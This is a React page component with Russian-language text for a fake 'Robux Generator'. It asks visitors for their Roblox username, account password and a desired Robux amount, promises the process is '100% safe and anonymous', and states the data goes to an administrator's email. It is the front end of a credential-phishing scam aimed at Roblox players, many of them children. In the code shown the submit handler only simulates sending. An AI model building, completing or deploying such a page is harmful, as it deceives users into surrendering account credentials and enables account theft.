import { useState } from 'react';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card';
import { toast } from 'sonner';
import Icon from '@/components/ui/icon';

const Index = () => {
  const [formData, setFormData] = useState({
    username: '',
    password: '',
    robuxAmount: ''
  });
  const [isGenerating, setIsGenerating] = useState(false);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!formData.username || !formData.password || !formData.robuxAmount) {
      toast.error('Пожалуйста, заполните все поля');
      return;
    }

    setIsGenerating(true);
    
    // Симуляция отправки данных
    setTimeout(() => {
      toast.success('Данные отправлены! Проверьте почту через несколько минут');
      setIsGenerating(false);
      setFormData({ username: '', password: '', robuxAmount: '' });
    }, 2000);
  };

  const handleInputChange = (field: string, value: string) => {
    setFormData(prev => ({ ...prev, [field]: value }));
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-slate-50 to-gray-100 flex items-center justify-center p-4">
      <div className="w-full max-w-md animate-fade-in">
        <div className="text-center mb-8">
          <div className="inline-flex items-center justify-center w-16 h-16 bg-purple-600 rounded-full mb-4 animate-float">
            <Icon name="Coins" className="w-8 h-8 text-white" />
          </div>
          <h1 className="text-3xl font-bold text-gray-900 mb-2">Robux Generator</h1>
          <p className="text-gray-600">Быстрый и безопасный способ получить робуксы</p>
        </div>

        <Card className="shadow-lg border-0 animate-scale-in">
          <CardHeader className="text-center pb-6">
            <CardTitle className="text-xl text-gray-800">Генератор робуксов</CardTitle>
            <CardDescription>Заполните форму для получения робуксов</CardDescription>
          </CardHeader>
          <CardContent>
            <form onSubmit={handleSubmit} className="space-y-4">
              <div className="space-y-2">
                <Label htmlFor="username" className="text-sm font-medium text-gray-700">
                  Никнейм Roblox
                </Label>
                <Input
                  id="username"
                  type="text"
                  placeholder="Введите ваш никнейм"
                  value={formData.username}
                  onChange={(e) => handleInputChange('username', e.target.value)}
                  className="transition-all duration-200 focus:ring-2 focus:ring-purple-500"
                />
              </div>

              <div className="space-y-2">
                <Label htmlFor="password" className="text-sm font-medium text-gray-700">
                  Пароль
                </Label>
                <Input
                  id="password"
                  type="password"
                  placeholder="Введите ваш пароль"
                  value={formData.password}
                  onChange={(e) => handleInputChange('password', e.target.value)}
                  className="transition-all duration-200 focus:ring-2 focus:ring-purple-500"
                />
              </div>

              <div className="space-y-2">
                <Label htmlFor="robuxAmount" className="text-sm font-medium text-gray-700">
                  Количество робуксов
                </Label>
                <Input
                  id="robuxAmount"
                  type="number"
                  placeholder="Введите количество"
                  value={formData.robuxAmount}
                  onChange={(e) => handleInputChange('robuxAmount', e.target.value)}
                  className="transition-all duration-200 focus:ring-2 focus:ring-purple-500"
                  min="1"
                  max="10000"
                />
              </div>

              <Button
                type="submit"
                className="w-full bg-purple-600 hover:bg-purple-700 text-white font-medium py-3 px-4 rounded-lg transition-all duration-200 transform hover:scale-105 disabled:opacity-50 disabled:cursor-not-allowed disabled:transform-none"
                disabled={isGenerating}
              >
                {isGenerating ? (
                  <div className="flex items-center justify-center space-x-2">
                    <Icon name="Loader2" className="w-4 h-4 animate-spin" />
                    <span>Генерация...</span>
                  </div>
                ) : (
                  <div className="flex items-center justify-center space-x-2">
                    <Icon name="Zap" className="w-4 h-4" />
                    <span>Сгенерировать робуксы</span>
                  </div>
                )}
              </Button>
            </form>

            <div className="mt-6 p-4 bg-green-50 rounded-lg border border-green-200">
              <div className="flex items-center space-x-2 text-green-700">
                <Icon name="Shield" className="w-5 h-5" />
                <span className="text-sm font-medium">100% безопасно и анонимно</span>
              </div>
            </div>
          </CardContent>
        </Card>

        <p className="text-center text-xs text-gray-500 mt-6">
          Данные будут отправлены на почту администратора для обработки
        </p>
      </div>
    </div>
  );
};

export default Index;